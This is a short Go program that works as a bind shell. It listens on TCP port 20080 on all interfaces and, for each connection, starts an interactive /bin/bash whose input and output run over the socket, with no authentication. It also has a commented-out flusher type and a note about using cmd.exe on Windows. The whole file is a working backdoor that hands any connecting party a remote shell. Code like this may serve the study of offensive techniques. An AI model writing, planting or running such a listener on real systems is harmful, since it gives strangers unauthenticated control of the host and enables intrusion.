package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

// type Flusher struct{}

// func NewFlusher(w io.Writer) *Flusher {
// 	return &Flusher{
// 		w: bufio.NewWriter(w),
// 	}
// }
// func (foo *Flusher) Write(b []byte) (int, error) {
// 	count, err := foo.w.Write(b)
// 	if err != nil {
// 		return -1, err
// 	}
// 	if err := foo.w.Flush(); err != nil {
// 		return -1, err
// 	}
// 	return count, err
// }
func handle(conn net.Conn) {
	//Explicitly calling /bin/bash and passing -i for interactive mode
	// so that we can use stdio/stdout
	// For windows use exec.Command("cmd.exe").
	cmd := exec.Command("/bin/bash", "-i")
	// set stdin to our conn
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	// Create a Flusher from the connection to use for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn.
	cmd.Stdout = wp
	// Run the Command.
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}
func main() {
	//Bind to TCP port 20080 on all interfaces
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening on 0.0.0.0:20080...")
	for {
		// wait for connection. create bet.Conn on connection estalished.
		conn, err := listener.Accept()
		log.Println("Received Connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		// Handle the Connection. Using goroutine for concurrency
		go handle(conn)
	}
}
